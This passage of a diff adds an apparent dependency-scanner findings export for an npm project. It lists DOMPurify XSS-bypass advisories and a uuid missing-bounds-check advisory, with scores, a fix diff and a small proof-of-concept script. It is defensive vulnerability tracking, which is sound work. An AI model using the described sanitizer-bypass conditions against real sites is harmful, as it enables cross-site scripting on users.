framework, is vulnerable to XSS.\n\n## Recommendations\n\n### Fix\n\n`normalize()` merges the split text nodes, then the same regex from the string path catches the expression. Placed before the fragment logic, this fixes both `RETURN_DOM` and `RETURN_DOM_FRAGMENT`.\n\n```diff\n     if (RETURN_DOM) {\n+      if (SAFE_FOR_TEMPLATES) {\n+        body.normalize();\n+        let html = body.innerHTML;\n+        arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {\n+          html = stringReplace(html, expr, ' ');\n+        });\n+        body.innerHTML = html;\n+      }\n+\n       if (RETURN_DOM_FRAGMENT) {\n         returnNode = createDocumentFragment.call(body.ownerDocument);\n```",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                "source": "GITHUB",
+                "published": "2026-04-22 17:32:54.0",
+                "title": "DOMPurify has a SAFE_FOR_TEMPLATES bypass in RETURN_DOM mode",
+                "cwes": [
+                    {
+                        "cweId": 79,
+                        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                    },
+                    {
+                        "cweId": 1289,
+                        "name": "Improper Validation of Unsafe Equivalence in Input"
+                    }
+                ],
+                "uuid": "4e8e64eb-da2c-45a9-afc3-f74d88b11c98",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:4e8e64eb-da2c-45a9-afc3-f74d88b11c98",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "uuid",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/uuid@8.3.2",
+                "uuid": "3b3a5fdb-c854-4775-a09f-097267e05c3d",
+                "version": "8.3.2",
+                "latestVersion": "14.0.0"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-23 11:22:56.166"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-w5hq-g745-h8pq",
+                "aliases": [],
+                "references": "* [https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq](https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq)\n* [https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34](https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34)\n* [https://github.com/uuidjs/uuid/releases/tag/v14.0.0](https://github.com/uuidjs/uuid/releases/tag/v14.0.0)\n* [https://github.com/advisories/GHSA-w5hq-g745-h8pq](https://github.com/advisories/GHSA-w5hq-g745-h8pq)",
+                "cvssV4Score": 6.3,
+                "cweId": 787,
+                "description": "### Summary\n\n`v3`, `v5`, and `v6` accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4`, `v1`, and `v7` explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3`/`v5` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4',()=>v4({},new Uint8Array(8),4)],\n  ['v5',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4 THREW RangeError`\n- `v5 NO_THROW`\n- `v6 NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4`/`v1`/`v7`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3` and `v5`)\n- `src/v6.ts`",
+                "source": "GITHUB",
+                "published": "2026-04-22 20:53:24.0",
+                "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+                "cwes": [
+                    {
+                        "cweId": 787,
+                        "name": "Out-of-bounds Write"
+                    },
+                    {
+                        "cweId": 1285,
+                        "name": "Improper Validation of Specified Index, Position, or Offset in Input"
+                    }
+                ],
+                "uuid": "4ed7a03a-7f55-47cc-9ae6-dad5c0d8a59c",
+                "severityRank": 2,
+                "cweName": "Out-of-bounds Write",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:3b3a5fdb-c854-4775-a09f-097267e05c3d:4ed7a03a-7f55-47cc-9ae6-dad5c0d8a59c",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "uuid",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/uuid@11.1.0",
+                "uuid": "49c53e83-f203-4c95-9909-375d00e3ffef",
+                "version": "11.1.0",
+                "latestVersion": "14.0.0"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-23 11:22:56.961"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-w5hq-g745-h8pq",
+                "aliases": [],
+                "references": "* [https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq](https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq)\n* [https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34](https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34)\n* [https://github.com/uuidjs/uuid/releases/tag/v14.0.0](https://github.com/uuidjs/uuid/releases/tag/v14.0.0)\n* [https://github.com/advisories/GHSA-w5hq-g745-h8pq](https://github.com/advisories/GHSA-w5hq-g745-h8pq)",
+                "cvssV4Score": 6.3,
+                "cweId": 787,
+                "description": "### Summary\n\n`v3`, `v5`, and `v6` accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4`, `v1`, and `v7` explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3`/`v5` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4',()=>v4({},new Uint8Array(8),4)],\n  ['v5',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4 THREW RangeError`\n- `v5 NO_THROW`\n- `v6 NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4`/`v1`/`v7`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3` and `v5`)\n- `src/v6.ts`",
+                "source": "GITHUB",
+                "published": "2026-04-22 20:53:24.0",
+                "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+                "cwes": [
+                    {
+                        "cweId": 787,
+                        "name": "Out-of-bounds Write"
+                    },
+                    {
+                        "cweId": 1285,
+                        "name": "Improper Validation of Specified Index, Position, or Offset in Input"
+                    }
+                ],
+                "uuid": "4ed7a03a-7f55-47cc-9ae6-dad5c0d8a59c",
+                "severityRank": 2,
+                "cweName": "Out-of-bounds Write",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:49c53e83-f203-4c95-9909-375d00e3ffef:4ed7a03a-7f55-47cc-9ae6-dad5c0d8a59c",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "uuid",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/uuid@9.0.1",
+                "uuid": "1983259d-6f2d-4b45-a7aa-1b55597d68fc",
+                "version": "9.0.1",
+                "latestVersion": "14.0.0"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-23 11:22:57.306"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-w5hq-g745-h8pq",
+                "aliases": [],
+                "references": "* [https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq](https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq)\n* [https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34](https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34)\n* [https://github.com/uuidjs/uuid/releases/tag/v14.0.0](https://github.com/uuidjs/uuid/releases/tag/v14.0.0)\n* [https://github.com/advisories/GHSA-w5hq-g745-h8pq](https://github.com/advisories/GHSA-w5hq-g745-h8pq)",
+                "cvssV4Score": 6.3,
+                "cweId": 787,
+                "description": "### Summary\n\n`v3`, `v5`, and `v6` accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4`, `v1`, and `v7` explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3`/`v5` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4',()=>v4({},new Uint8Array(8),4)],\n  ['v5',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4 THREW RangeError`\n- `v5 NO_THROW`\n- `v6 NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4`/`v1`/`v7`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3` and `v5`)\n- `src/v6.ts`",
+                "source": "GITHUB",
+                "published": "2026-04-22 20:53:24.0",
+                "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+                "cwes": [
+                    {
+                        "cweId": 787,
+                        "name": "Out-of-bounds Write"
+                    },
+                    {
+                        "cweId": 1285,
+                        "name": "Improper Validation of Specified Index, Position, or Offset in Input"
+                    }
+                ],
+                "uuid": "4ed7a03a-7f55-47cc-9ae6-dad5c0d8a59c",
+                "severityRank": 2,
+                "cweName": "Out-of-bounds Write",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:1983259d-6f2d-4b45-a7aa-1b55597d68fc:4ed7a03a-7f55-47cc-9ae6-dad5c0d8a59c",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-23 23:20:41.313"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 6.9,
+                "vulnId": "CVE-2026-41238",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-v9jr-rg53-9pgp",
+                        "cveId": "CVE-2026-41238"
+                    }
+                ],
+                "references": "* [https://github.com/cure53/DOMPurify/releases/tag/3.4.0](https://github.com/cure53/DOMPurify/releases/tag/3.4.0)\n* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp](https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp)",
+                "cweId": 79,
+                "description": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathML, and SVG. Versions 3.0.1 through 3.3.3 are vulnerable to a prototype pollution-based XSS bypass. When an application uses `DOMPurify.sanitize()` with the default configuration (no `CUSTOM_ELEMENT_HANDLING` option), a prior prototype pollution gadget can inject permissive `tagNameCheck` and `attributeNameCheck` regex values into `Object.prototype`, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes \u2014 including event handlers \u2014 through sanitization. Version 3.4.0 fixes the issue.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                "epssScore": 0.00033,
+                "source": "NVD",
+                "published": "2026-04-23 16:16:26.42",
+                "cwes": [
+                    {
+                        "cweId": 79,
+                        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                    },
+                    {
+                        "cweId": 1321,
+                        "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+                    }
+                ],
+                "uuid": "e6d4f904-dafa-4502-9c27-92081ebb7cd6",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+                "epssPercentile": 0.09722
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:e6d4f904-dafa-4502-9c27-92081ebb7cd6",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-23 23:20:41.369"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 6.8,
+                "vulnId": "CVE-2026-41239",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-crv5-9vww-q3g8",
+                        "cveId": "CVE-2026-41239"
+                    }
+                ],
+                "references": "* [https://github.com/cure53/DOMPurify/releases/tag/3.4.0](https://github.com/cure53/DOMPurify/releases/tag/3.4.0)\n* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8](https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8)",
+                "cweId": 79,
+                "description": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathML, and SVG. Starting in version 1.0.10 and prior to version 3.4.0, `SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2. Version 3.4.0 patches the issue.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                "epssScore": 0.00048,
+                "source": "NVD",
+                "published": "2026-04-23 16:16:26.56",
+                "cwes": [
+                    {
+                        "cweId": 79,
+                        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                    },
+                    {
+                        "cweId": 1289,
+                        "name": "Improper Validation of Unsafe Equivalence in Input"
+                    }
+                ],
+                "uuid": "6ba91a7e-28ee-4268-a031-69ba2bdd9e75",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+                "epssPercentile": 0.14871
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:6ba91a7e-28ee-4268-a031-69ba2bdd9e75",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "alternateIdentifier": "CVE-2026-41240",
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-24 16:04:30.817",
+                "referenceUrl": "https://ossindex.sonatype.org/vulnerability/CVE-2026-41240?component-type=npm&component-name=dompurify&utm_source=dependency-track&utm_medium=integration&utm_content=v4.14.1"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "CVE-2026-41240",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-h7mw-gpvr-xq4m",
+                        "cveId": "CVE-2026-41240"
+                    }
+                ],
+                "references": "* [https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80)\n* [https://github.com/cure53/DOMPurify/releases/tag/3.4.0](https://github.com/cure53/DOMPurify/releases/tag/3.4.0)\n* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m](https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m)",
+                "cvssV4Score": 6,
+                "cweId": 79,
+                "description": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathML, and SVG. Versions prior to 3.4.0 have an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used. Commit c361baa added an early exit for FORBID_ATTR at line 1214. The same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely. This allows forbidden elements to survive sanitization with their attributes intact. Version 3.4.0 patches the issue.",
+                "epssScore": 0.00045,
+                "source": "NVD",
+                "published": "2026-04-23 16:16:26.71",
+                "cwes": [
+                    {
+                        "cweId": 79,
+                        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                    },
+                    {
+                        "cweId": 183,
+                        "name": "Permissive List of Allowed Inputs"
+                    }
+                ],
+                "uuid": "d400258f-b33b-45be-a7d7-0ec00bfaf50f",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "epssPercentile": 0.13604
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:d400258f-b33b-45be-a7d7-0ec00bfaf50f",
+            "analysis": {
+                "isSuppressed": false
+            }
+        }
+    ],
+    "project": {
+        "name": "acme/acme-site (npm)",
+        "purl": "pkg:npm/acme-site@1.0.0",
+        "uuid": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+        "version": "develop"
+    },
+    "version": "1.3"
+}
